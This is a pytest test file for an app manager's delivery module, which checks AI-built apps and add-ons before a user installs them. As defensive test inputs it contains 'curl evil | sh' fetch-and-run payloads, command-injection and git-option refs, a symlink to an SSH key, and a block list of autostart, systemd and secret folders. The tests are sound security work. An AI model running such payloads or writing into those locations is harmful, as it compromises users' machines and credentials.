"""Deliveries: what is copied out of the workspace, what is recorded with it, and installing."""

import asyncio

import pytest
from fakesandbox import FakeSandbox, commit_patch, make_appimage, make_runtime, offered

from davibemanager import apps, delivery, versions
from davibemanager.workspace import podman, scripts

APPIMAGE = make_appimage()


@pytest.mark.parametrize("bad", ["/etc/passwd", "/work", "/work/../etc/shadow", "work/x", "", "/home/agent/x"])
def test_only_paths_under_work_can_be_delivered(bad):
    with pytest.raises(delivery.DeliveryError):
        delivery.check_work_path(bad)


def test_work_paths_are_normalised():
    assert delivery.check_work_path("/work/out//App.AppImage") == "/work/out/App.AppImage"


@pytest.mark.parametrize("bad", ["--upload-pack=evil", "v1..v2", "-x", "a b", "$(id)", ""])
def test_base_refs_cannot_be_git_options_or_ranges(bad):
    with pytest.raises(delivery.DeliveryError):
        delivery.check_ref(bad)


def test_tags_and_commits_are_fine():
    for ref in ("3.12.6", "v1.2.0-rc1", "a1b2c3d4e5", "origin/main", "HEAD~3"):
        assert delivery.check_ref(ref) == ref


def test_an_appimage_is_recognised_by_its_magic(tmp_path):
    (tmp_path / "a").write_bytes(APPIMAGE)
    (tmp_path / "b").write_bytes(b"#!/bin/sh\necho hi\n")
    assert delivery.is_appimage(tmp_path / "a") and not delivery.is_appimage(tmp_path / "b")



@pytest.fixture
async def workspace(env, monkeypatch):
    """A builder turn in progress, with the sandbox played by FakeSandbox."""
    engine, _, _ = env

    class Builder:                      # a turn in progress, as BuilderSession has during one
        entry = {"parts": []}
        busy = True

        async def close(self):
            pass
    engine.builder = Builder()
    sb = FakeSandbox()
    sb.repo("/work/src/gthumb", head="bbbb222", patch=commit_patch("bbbb222", "Add copy path", "-old\n+added line"))
    sb.files["/work/src/gthumb/build.sh"] = b"meson setup build && ninja -C build && make-appimage\n"
    sb.install(monkeypatch, engine)
    offered(engine)
    return engine, sb


def named(sb, repo, change):
    """The repository's commits as they are once delivered: naming their change (as the app's tree has them)."""
    sb.repos[repo]["patch"] = sb.repos[repo]["patch"].replace("DVM-Change: new", f"DVM-Change: {change}")


ARGS = {"kind": "appimage", "path": "/work/out/gThumb-DVM.AppImage", "name": "gThumb", "version": "3.12.6-dvm1",
        "repo": "/work/src/gthumb", "base_ref": "3.12.6", "summary": "Adds Copy path.", "change_title": "Copy path",
        "feature": "# Copy path\nThe user asked for…", "run_instructions": "Run it.", "build_script": "/work/src/gthumb/build.sh",
        "integration": "app", "tested": "Opened it under xvfb and zoomed.", "not_tested": "The user's desktop and theme."}


async def test_a_delivery_keeps_the_patch_feature_and_facts_needed_to_make_it_again(workspace):
    engine, sb = workspace
    reply = await engine.builder_deliver(ARGS)
    assert reply.startswith("Delivered as D1, for the app gthumb")
    d = delivery.root_dir() / "D1"
    meta = delivery.load(d)
    assert (meta["base_commit"], meta["head_commit"]) == ("aaaa111", "bbbb222")
    assert meta["upstream"] == "https://gitlab.gnome.org/GNOME/gthumb.git" and meta["status"] == "new"
    assert meta["sha256"] == delivery.sha256_file(d / meta["file"]) and meta["runtime_checked"]
    assert (d / "changes.patch").read_text().startswith("From bbbb222")
    assert (d / "FEATURE.md").read_text().startswith("# Copy path")
    assert (d / "desktop" / "app.desktop").exists() and (d / "desktop" / "icon.png").exists()
    assert engine.builder.entry["parts"] == [{"t": "delivery", "id": "D1"}]


async def test_an_appimage_is_rebuilt_with_its_build_script_to_check_it(workspace):
    engine, sb = workspace
    with pytest.raises(delivery.DeliveryError, match="build_script is required"):
        await engine.builder_deliver({k: v for k, v in ARGS.items() if k != "build_script"})
    sb.rebuilt = make_appimage(b"the app's own build")
    await engine.builder_deliver(ARGS)
    builds = sb.calls_of(scripts.CHECK_BUILD)
    assert sb.checks == [("start", "localhost/davibemanager-workspace:test"), ("remove", "dvm-sandbox")]
    [b] = builds                                                # the delivered commit, once, clean
    assert sb.where[sb.calls.index(b)] == "dvm-sandbox-check"  # never in the sandbox itself
    # the app's own copy of the commit, and of the script, in the clean container
    assert sb.snapshots == ["/work/src/gthumb"]
    assert b[4:8] == ["/work/.dvm/snapshot.git", "bbbb222", "/work/.dvm/build/verify-D1", "/work/.dvm/build.sh"]
    assert sb.built_with == [sb.files["/work/src/gthumb/build.sh"].decode()]
    assert b[-1] == "build"
    d = delivery.root_dir() / "D1"
    meta = delivery.load(d)
    assert (d / meta["file"]).read_bytes() == sb.rebuilt         # what the user gets: the app's build
    assert "reproducible" not in meta                           # not asked for of the user's own apps
    sb.fail["build"] = "meson: command not found"
    named(sb, "/work/src/gthumb", "copy-path")
    with pytest.raises(delivery.DeliveryError, match="(?s)clean container.*That failed.*:\nmeson: command not found"):
        await engine.builder_deliver({**ARGS, "updates": "gthumb"})


async def test_a_build_script_given_as_its_text_is_kept_in_a_file_and_built_with(workspace):
    """GLM gave the script itself, not its path: refused, it delivered again, and the app built it
    again. Now the text works as well as the path."""
    engine, sb = workspace
    text = "#!/bin/sh\nset -e\nmeson setup build && ninja -C build && make-appimage\n"
    await engine.builder_deliver({**ARGS, "build_script": text})
    assert sb.files["box:/work/.dvm/build.sh"] == text.encode() and sb.built_with == [text]
    assert sb.calls_of(scripts.CHECK_BUILD)[-1][7] == "/work/.dvm/build.sh"
    assert apps.read_file("gthumb", "build.sh") == text           # saved for the next versions too


async def test_the_apps_own_builds_at_delivery_show_how_far_they_are(workspace):
    engine, sb = workspace
    seen = []
    real = sb._script

    def script(sc, args, on_line, *rest):
        if sc == scripts.CHECK_BUILD:
            seen.append(engine._checking and engine._checking["label"])
        return real(sc, args, on_line, *rest)
    sb._script = script
    await engine.builder_deliver(ARGS)
    assert seen == ["build"] and engine._checking is None


async def test_the_clean_build_has_only_the_packages_the_delivery_names(workspace):
    """Something the assistant installed in the sandbox but didn't name would make a build that works
    there and nowhere else (a new version, a reset sandbox)."""
    engine, sb = workspace
    await engine.builder_deliver({**ARGS, "build_packages": ["meson", "libgtk-3-dev"]})
    assert sb.check_packages == [("dvm-sandbox-check", ["meson", "libgtk-3-dev"])]
    assert sb.installed_packages == []                         # nothing installed in the sandbox for it
    sb.fail["packages"] = "E: Unable to locate package libgtk-9-dev"
    named(sb, "/work/src/gthumb", "copy-path")
    with pytest.raises(delivery.DeliveryError, match="couldn't install your build_packages"):
        await engine.builder_deliver({**ARGS, "build_packages": ["libgtk-9-dev"], "updates": "gthumb"})
    assert sb.checks[-1] == ("remove", "dvm-sandbox")          # removed, whatever happened


async def test_without_the_sandbox_running_there_is_no_clean_build(workspace):
    engine, sb = workspace
    engine.workspace = {"state": "stopped"}
    with pytest.raises(delivery.DeliveryError, match="couldn't start a clean container"):
        await engine.builder_deliver(ARGS)


async def test_a_delivery_needs_feature_notes_and_a_real_appimage_on_the_pinned_runtime(workspace):
    engine, sb = workspace
    with pytest.raises(delivery.DeliveryError, match="FEATURE.md"):
        await engine.builder_deliver({**ARGS, "feature": ""})
    sb.appimage = b"#!/bin/sh\ncurl evil | sh\n"
    with pytest.raises(delivery.DeliveryError, match="isn't a type 2 AppImage"):
        await engine.builder_deliver(ARGS)
    # an AppImage whose runtime (what Gear Lever or Shelly run to read it) is code of the build's choosing
    sb.appimage = make_appimage(runtime=make_runtime(b"\xcc" * 64))
    with pytest.raises(delivery.DeliveryError, match="pinned AppImage runtime"):
        await engine.builder_deliver(ARGS)
    assert not (delivery.root_dir() / "D1").exists()      # nothing half-made is kept


async def test_a_tampered_delivery_is_not_installed(workspace, tmp_path):
    engine, _ = workspace
    await engine.builder_deliver(ARGS)
    d = delivery.root_dir() / "D1"
    (d / delivery.load(d)["file"]).write_bytes(APPIMAGE + b"extra")
    engine.cfg.settings.install_dir = str(tmp_path / "Apps")
    with pytest.raises(Exception, match="no longer matches"):
        engine.install_delivery("D1")


# ---------------------------------------------------------------- add-ons, versions

GTHUMB_TAGS = ["3.12.4", "3.12.5", "3.12.6", "3.12.7", "3.14.0.rc1", "GTHUMB_2_10_0", "v4", "3.14.0-beta"]


def test_the_newest_release_in_the_same_naming_is_found():
    assert versions.newer("3.12.6", GTHUMB_TAGS) == "3.12.7"
    assert versions.newer("v0.38.0", ["v0.38.0", "v0.39.0", "v0.40.0-rc1", "v0.39.1"]) == "v0.39.1"
    assert versions.newer("v0.40.0-rc1", ["v0.38.0", "v0.40.0-rc1", "v0.40.0"]) == "v0.40.0"   # a pre-release, then its release
    assert versions.newer("3.12.7", GTHUMB_TAGS) is None                      # pre-releases don't count
    assert versions.newer("a1b2c3d", GTHUMB_TAGS) is None                     # a commit: nothing to compare with
    out = "abc\trefs/tags/3.12.6\ndef\trefs/tags/3.12.7\nxyz\trefs/heads/main\n"
    assert versions.tags_from_ls_remote(out) == ["3.12.6", "3.12.7"]


@pytest.mark.parametrize("ok", ["~/.config/mpv/scripts", "~/.local/share/gimp/plug-ins", "~/.mpv/scripts/"])
def test_addons_go_into_an_apps_own_folder(ok):
    assert delivery.check_install_to(ok) == ok.rstrip("/")


@pytest.mark.parametrize("bad", ["~/.ssh/keys", "~/.config/autostart", "~/.config/systemd/user", "~/.local/bin",
                                 "~/Documents", "~", "/etc/mpv", "~/../other/.config/x", "~/.gnupg/x",
                                 "~/.local/share/applications", "~/.config/davibemanager/x", "mpv/scripts",
                                 # Podman's own settings: a containers.conf.d file could mount the home into the sandbox
                                 "~/.config/containers/containers.conf.d", "~/.config/containers/systemd",
                                 "~/.local/share/containers/storage", "~/.local/share/dbus-1/services",
                                 "~/.oh-my-zsh/custom", "~/.local/share/bash-completion/completions", "~/.config/sway/x",
                                 "~/.cargo/bin", "~/.var/app/org.mozilla.firefox", "~/snap/firefox/common"])
def test_addons_never_go_where_things_run_by_themselves_or_secrets_are(bad):
    with pytest.raises(delivery.DeliveryError):
        delivery.check_install_to(bad)


def test_an_addon_folder_that_leads_elsewhere_by_a_symlink_is_refused(tmp_path):
    home = tmp_path / "home"
    (home / ".ssh").mkdir(parents=True)
    (home / ".config").mkdir()
    (home / ".config" / "mpv").symlink_to(home / ".ssh")
    with pytest.raises(delivery.DeliveryError, match="can't go"):
        delivery.addon_dir("~/.config/mpv/scripts", home)


def test_an_addon_never_goes_into_a_folder_on_this_computers_path(tmp_path):
    """Whatever the list says: a program there would run in place of a system one of its name."""
    home = tmp_path / "home"
    (home / ".config" / "mpv").mkdir(parents=True)
    path = f"/usr/bin:{home}/.config/mpv/scripts:~/nothing"
    with pytest.raises(delivery.DeliveryError, match="PATH"):
        delivery.addon_dir("~/.config/mpv/scripts", home, path)
    with pytest.raises(delivery.DeliveryError, match="PATH"):
        delivery.addon_dir("~/.config/mpv/scripts/lua", home, path)
    assert delivery.addon_dir("~/.config/mpv/fonts", home, path) == (home / ".config/mpv/fonts").resolve()


SCRIPT = {"kind": "addon", "path": "/work/apps/burst/burst-screenshot.lua", "name": "mpv burst screenshots",
          "version": "1.0", "repo": "/work/apps/burst", "summary": "Ctrl+B saves ten frames.",
          "feature": "# Burst", "install_to": "~/.config/mpv/scripts", "change_title": "Burst screenshots",
        "integration": "app", "tested": "Opened it under xvfb and zoomed.", "not_tested": "The user's desktop and theme."}


@pytest.fixture
def burst(workspace):
    engine, sb = workspace
    sb.repo("/work/apps/burst", head="bbbb222", base_tag="none", patch=commit_patch("bbbb222", "Burst", "+-- burst"),
            remote="")
    return engine, sb


async def test_an_addon_of_its_own_installs_into_the_apps_folder_keeping_the_users_file(burst, monkeypatch, tmp_path):
    engine, sb = burst
    await engine.builder_deliver(SCRIPT)                     # no base_ref: something new of its own
    meta = delivery.load(delivery.root_dir() / "D1")
    assert meta["kind"] == "addon" and meta["base_ref"] == "" and meta["upstream"] == ""
    assert ["git", "-C", "/work/.dvm/snapshot.git", "format-patch", "--stdout", "--no-signature", "--root", "bbbb222"] in sb.calls
    assert sb.snapshots == ["/work/apps/burst"]                # the app's own copy of the commit, as for an app
    assert meta["files"] == ["burst-screenshot.lua"] and len(meta["sha256"]) == 64

    home = tmp_path / "home"
    scripts = home / ".config" / "mpv" / "scripts"
    scripts.mkdir(parents=True)
    (scripts / "burst-screenshot.lua").write_text("-- the user's own\n")
    monkeypatch.setenv("HOME", str(home))
    # delivered is not installed: nothing reaches the app's folder until the user clicks Install
    assert (scripts / "burst-screenshot.lua").read_text() == "-- the user's own\n" and len(list(scripts.iterdir())) == 1
    assert delivery.load(delivery.root_dir() / "D1")["status"] == "new"
    meta = engine.install_delivery("D1")
    assert (scripts / "burst-screenshot.lua").read_text() == "-- burst v1\n"
    assert (scripts / "burst-screenshot.lua.before-D1").read_text() == "-- the user's own\n"
    assert meta["installed_to"] == str(scripts) and meta["backups"]

    # its update replaces the installed file (no second backup) and takes the earlier one's place
    sb.files["/work/apps/burst/burst-screenshot.lua"] = b"-- burst v2\n"
    with pytest.raises(delivery.DeliveryError, match="no app or earlier delivery"):
        await engine.builder_deliver({**SCRIPT, "updates": "D9"})
    named(sb, "/work/apps/burst", "burst-screenshots")
    await engine.builder_deliver({**SCRIPT, "version": "1.1", "updates": "D1"})
    engine.install_delivery("D2")
    assert (scripts / "burst-screenshot.lua").read_text() == "-- burst v2\n"
    assert not (scripts / "burst-screenshot.lua.before-D2").exists()
    old, new = delivery.load(delivery.root_dir() / "D1"), delivery.load(delivery.root_dir() / "D2")
    assert old["status"] == "replaced" and old["replaced_by"] == "D2"
    assert new["app"] == old["app"] and new["replaces"] == "D1" and new["status"] == "installed"


async def test_a_tampered_or_symlinked_addon_is_not_installed(burst, monkeypatch, tmp_path):
    engine, sb = burst

    async def copy_link(name, src, dest):
        dest.mkdir()
        (dest / "x.lua").symlink_to("/home/user/.ssh/id_ed25519")
    real = podman.copy_out
    monkeypatch.setattr(podman, "copy_out", copy_link)
    with pytest.raises(delivery.DeliveryError, match="ordinary files"):
        await engine.builder_deliver({**SCRIPT, "path": "/work/apps/burst/scripts"})
    monkeypatch.setattr(podman, "copy_out", real)
    await engine.builder_deliver(SCRIPT)
    (delivery.root_dir() / "D1" / "addon" / "burst-screenshot.lua").write_text("os.execute('curl evil | sh')\n")
    monkeypatch.setenv("HOME", str(tmp_path))
    with pytest.raises(Exception, match="no longer matches"):
        engine.install_delivery("D1")


async def test_a_delivery_says_how_deep_it_goes_and_what_was_and_wasnt_tested(workspace):
    engine, sb = workspace
    for missing, match in (("integration", "integration is required"), ("tested", "what you tested"),
                           ("not_tested", "what you could not")):
        with pytest.raises(delivery.DeliveryError, match=match):
            await engine.builder_deliver({k: v for k, v in ARGS.items() if k != missing})
    with pytest.raises(delivery.DeliveryError, match="integration is required"):
        await engine.builder_deliver({**ARGS, "integration": "kernel"})
    await engine.builder_deliver({**ARGS, "integration": "desktop", "try_steps": ["Open a folder", "  ", "Set a wallpaper"]})
    meta = delivery.load(delivery.root_dir() / "D1")
    assert meta["integration"] == "desktop" and meta["not_tested"] == "The user's desktop and theme."
    assert meta["try_steps"] == ["Open a folder", "Set a wallpaper"]
    from davibemanager import apps
    app = apps.load("gthumb")
    assert app["integration"] == "desktop" and app["try_steps"] == ["Open a folder", "Set a wallpaper"]
    # the app's own rebuild of it on a new version: told the same depth and checklist
    report = engine._delivery_report({"updates": "gthumb", "tested": "Built twice.", "not_tested": "Not run at all."}, None)
    assert report["integration"] == "desktop" and report["try_steps"] == ["Open a folder", "Set a wallpaper"]


async def test_trying_an_app_runs_a_checked_copy_without_installing_it(workspace, monkeypatch):
    import subprocess
    from davibemanager.models import UserError
    engine, sb = workspace
    ran = []
    monkeypatch.setattr(subprocess, "Popen", lambda argv, **kw: ran.append((argv, kw)))
    await engine.builder_deliver(ARGS)
    engine.try_delivery("D1")
    (argv, kw), = ran
    target = argv[0]
    assert target.startswith(str(engine.runtime_dir / "trial")) and kw["start_new_session"]
    from pathlib import Path
    meta = delivery.load(delivery.root_dir() / "D1")
    assert delivery.sha256_file(Path(target)) == meta["sha256"] and meta["tried"] and meta["status"] == "new"
    (delivery.root_dir() / "D1" / meta["file"]).write_bytes(b"changed since")
    with pytest.raises(UserError, match="no longer matches"):
        engine.try_delivery("D1")
    assert len(ran) == 1


async def test_an_addon_of_its_own_takes_a_second_change_on_top_of_its_first(burst):
    """No official source, so no tree the app prepared: its first change's commits still say "new" in
    the assistant's own repository, and are known by their patch."""
    engine, sb = burst
    await engine.builder_deliver(SCRIPT)
    sb.repo("/work/apps/burst", head="bbbb333", base_tag="none", remote="",
            patch=commit_patch("bbbb222", "Burst", "+-- burst") + commit_patch("bbbb333", "Faster", "+-- faster"))
    await engine.builder_deliver({**SCRIPT, "version": "1.1", "change_title": "Faster bursts"})
    a = apps.load(delivery.load(delivery.root_dir() / "D2")["app"])
    assert [c["title"] for c in a["changes"]] == ["Burst screenshots", "Faster bursts"]


async def test_a_build_gets_no_second_opinion(workspace):
    """A reviewer can't read a whole app's code, and said so every time: commands only."""
    engine, sb = workspace
    engine.cfg.settings.second_opinion = "all"
    await engine.builder_deliver(ARGS)
    await asyncio.sleep(0.1)
    meta = delivery.load(delivery.root_dir() / "D1")
    assert "review" not in meta


async def test_a_delivery_is_checked_and_built_from_a_copy_nothing_in_the_sandbox_can_change(workspace):
    """Something the assistant leaves running in the sandbox could change its repository or build
    script while the app reads them: the app copies the commit (and the script) into its clean
    container first, and what the user reads, what is checked and what is built are all that copy."""
    engine, sb = workspace
    real = sb._script
    original_script = sb.files["/work/src/gthumb/build.sh"]

    def meanwhile(sc, args, on_line, at):
        out = real(sc, args, on_line, at)
        if sc == scripts.SNAPSHOT:                                  # just after the app took its copies
            sb.repos["/work/src/gthumb"].update(head="eeee555", patch=commit_patch("eeee555", "Other", "+evil()"))
        if sc == scripts.COPY_IN:
            sb.files["/work/src/gthumb/build.sh"] = b"curl evil | sh\n"
        return out
    sb._script = meanwhile
    await engine.builder_deliver(ARGS)
    d = delivery.root_dir() / "D1"
    meta = delivery.load(d)
    assert meta["head_commit"] == "bbbb222" and "evil" not in (d / "changes.patch").read_text()
    assert sb.built_with == [original_script.decode()] and apps.read_file("gthumb", "build.sh") == original_script.decode()
    # and the build never passed through the sandbox: nothing of it there to tidy away, or to swap
    assert not [p for p in sb.files if p.startswith("/work/.dvm/build/")]
    assert all(sb.where[i] == "dvm-sandbox-check" for i, c in enumerate(sb.calls)
               if c[:3] in (["sh", "-c", scripts.CHECK_BUILD], ["sh", "-c", scripts.EXTRACT]) or c[:3] == ["python3", "-c", scripts.INSPECT])


async def test_what_git_shows_of_a_delivery_takes_nothing_of_the_agents_repository(workspace, monkeypatch):
    """Read in the app's own copy, without attributes: a hidden "-diff" can't show code as binary."""
    engine, sb = workspace
    seen = []
    real = sb.exec_agent

    async def exec_agent(name, argv, **kw):
        if argv[:1] == ["git"] and "format-patch" in argv:
            seen.append((name, argv[2], kw.get("env")))
        return await real(name, argv, **kw)
    monkeypatch.setattr(podman, "exec_agent", exec_agent)
    await engine.builder_deliver(ARGS)
    assert seen == [("dvm-sandbox-check", "/work/.dvm/snapshot.git", {"GIT_ATTR_SOURCE": "4b825dc642cb6eb9a060e54bf8d69288fbee4904"})]


async def test_resetting_waits_for_builds_and_forgets_what_was_in_the_sandbox(workspace, no_real_podman):
    from davibemanager.config import data_dir
    from davibemanager.models import UserError
    engine, sb = workspace
    engine.builder = None                                     # the assistant isn't working (that's refused too)
    engine.app_manager.building["gthumb"] = {"step": "build"}
    with pytest.raises(UserError, match="being built"):
        await engine.reset_workspace()
    engine.app_manager.building.clear()
    engine._packages_installed = {"meson"}
    (data_dir() / "restored-sessions").mkdir(parents=True)
    engine.start_workspace = lambda: None
    await engine.reset_workspace()
    assert engine._packages_installed == set() and not (data_dir() / "restored-sessions").exists()
